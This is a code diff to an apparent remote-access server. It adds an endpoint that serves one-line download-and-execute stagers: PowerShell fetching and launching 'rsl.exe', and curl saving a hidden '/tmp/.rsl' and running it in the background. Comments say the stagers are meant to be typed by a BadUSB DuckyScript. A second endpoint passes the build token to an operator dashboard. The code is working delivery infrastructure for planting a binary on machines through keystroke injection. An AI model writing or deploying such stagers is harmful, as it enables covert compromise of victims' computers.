@@ -158,6 +158,45 @@ export function dlRouter() {
     }
   });
 
+  // Short bootstrap script endpoint. Returns a tiny sh/ps1 script that
+  // curls the full binary from /dl and runs it. Lets the DuckyScript type
+  // a short URL (curl ... | sh) instead of a long one with all the params.
+  //   GET /s?token=...&os=linux&arch=amd64&tags=...
+  router.get("/s", (req, res) => {
+    if (!config.BUILD_TOKEN) {
+      return res.status(404).json({ error: "BUILD_TOKEN not set" });
+    }
+    const token = String(req.query.token || "");
+    if (!token || token !== config.BUILD_TOKEN) {
+      return res.status(403).json({ error: "invalid token" });
+    }
+    const osName = String(req.query.os || "").toLowerCase();
+    if (!osName) {
+      return res.status(400).json({ error: "os query param required" });
+    }
+
+    // Build the /dl URL the bootstrap script will fetch. We pass the same
+    // query params through (minus the token, which the script re-adds from
+    // an env var so it doesn't appear in the DuckyScript).
+    const params = new URLSearchParams({ token, os: osName });
+    if (req.query.arch) params.set("arch", req.query.arch);
+    if (req.query.tags) params.set("tags", req.query.tags);
+    const proto = req.secure || req.headers["x-forwarded-proto"] === "https" ? "https" : "http";
+    const host = req.headers["x-forwarded-host"] || req.headers.host || "";
+    const dlUrl = `${proto}://${host}/dl?${params}`;
+
+    const isWindows = osName === "windows" || osName === "win";
+    if (isWindows) {
+      const script = `$r="${dlUrl}"; $o="$env:TEMP\\rsl.exe"; (New-Object Net.WebClient).DownloadFile($r,$o); Start-Process $o`;
+      res.setHeader("Content-Type", "text/plain");
+      res.send(script);
+    } else {
+      const script = `curl -sL '${dlUrl}' -o /tmp/.rsl && chmod +x /tmp/.rsl && /tmp/.rsl &`;
+      res.setHeader("Content-Type", "text/x-shellscript");
+      res.send(script);
+    }
+  });
+
   return router;
 }
 
@@ -166,6 +205,13 @@ export function buildRouter() {
 
   router.get("/targets", (req, res) => {
     res.json(Object.keys(TARGETS));
+  });
+
+  // Return BUILD_TOKEN so the dashboard's BadUSB modal can build the /s
+  // URL without the operator typing it. Behind requireAuth (mounted at
+  // /api/build), so only authenticated operators see it.
+  router.get("/token", (req, res) => {
+    res.json({ token: config.BUILD_TOKEN || "" });
   });
 
   router.get("/client", async (req, res) => {
